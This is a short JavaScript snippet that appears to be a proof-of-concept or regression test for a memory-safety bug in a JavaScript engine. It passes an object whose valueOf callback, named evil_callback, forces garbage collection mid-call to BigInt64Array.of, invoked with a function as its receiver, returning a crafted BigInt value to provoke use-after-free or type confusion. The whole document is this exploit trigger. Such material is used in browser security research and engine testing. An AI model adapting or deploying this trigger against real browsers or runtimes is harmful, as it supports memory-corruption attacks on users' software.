const v2 = new BigInt64Array(11);
var array = v2;
function evil_callback() {
    gc();
    return 71748523475265n - 16n;
}
var evil_object = { valueOf: evil_callback };
function f12() {
    return array;
}
var root = BigInt64Array.of.call(f12, evil_object);
gc();
